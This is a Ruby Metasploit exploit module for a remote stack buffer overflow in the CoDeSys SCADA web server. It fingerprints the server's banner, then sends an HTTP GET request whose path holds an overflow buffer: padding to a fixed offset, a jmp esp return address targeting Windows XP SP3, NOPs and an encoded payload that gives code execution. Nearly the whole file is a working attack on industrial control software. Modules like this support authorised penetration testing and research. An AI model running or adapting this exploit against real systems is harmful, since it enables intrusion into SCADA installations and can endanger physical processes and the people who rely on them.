# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;CoDeSys SCADA v2.3 Webserver Stack Buffer Overflow&#039;,
            &#039;Description&#039;     => %q{
                This module exploits a remote stack buffer overflow vulnerability in
                3S-Smart Software Solutions product CoDeSys Scada Web Server Version 1.1.9.9.
            },
            &#039;License&#039;         => MSF_LICENSE,
            &#039;Author&#039;          =>
                [
                    &#039;Celil UNUVER&#039;, # Original discovery and exploit
                    &#039;TecR0c&#039;,       # Module Metasploit
                    &#039;sinn3r&#039;
                ],
            &#039;References&#039;      =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18187/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-336-01A.pdf&#039; ]
                ],
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;false&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;        => &#039;win&#039;,
            &#039;Payload&#039;         =>
                {
                    &#039;size&#039;     => 4000,
                    &#039;BadChars&#039; => "\x00\x09\x0a\x3f\x20\x23\x5e",
                },
 
            &#039;Targets&#039;         =>
                [
                    [
                        &#039;Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039;    => 0x7E4456F7,
                            &#039;Offset&#039; => 775
                        }
                    ], # jmp esp user32
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Dec 02 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options([Opt::RPORT(8080)], self.class)
    end
 
    def check
        connect
        sock.put("GET / HTTP/1.1\r\n\r\n")
        res = sock.get(-1, 3)
        disconnect
 
        # Can&#039;t flag the web server as vulnerable, because it doesn&#039;t
        # give us a version
        vprint_line(res)
        if res =~ /3S_WebServer/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        connect
 
        buffer =  rand_text(target[&#039;Offset&#039;])
        buffer << [target.ret].pack(&#039;V&#039;)
        buffer << make_nops(8)
        buffer << payload.encoded
 
        sploit = "GET /#{buffer} HTTP/1.0\r\n\r\n\r\n"
 
        print_status("Trying target #{target.name}...")
        sock.put(sploit)
        res = sock.recv(1024)
        print_line(res)
 
        handler
        disconnect
    end
end
 
=begin
target.ret verified on:
- Win XP SP3 unpatched
- Win XP SP3 fully-patched
- Win XP SP3 fully-patched with Office 2007 Ultimate SP2 installed
=end



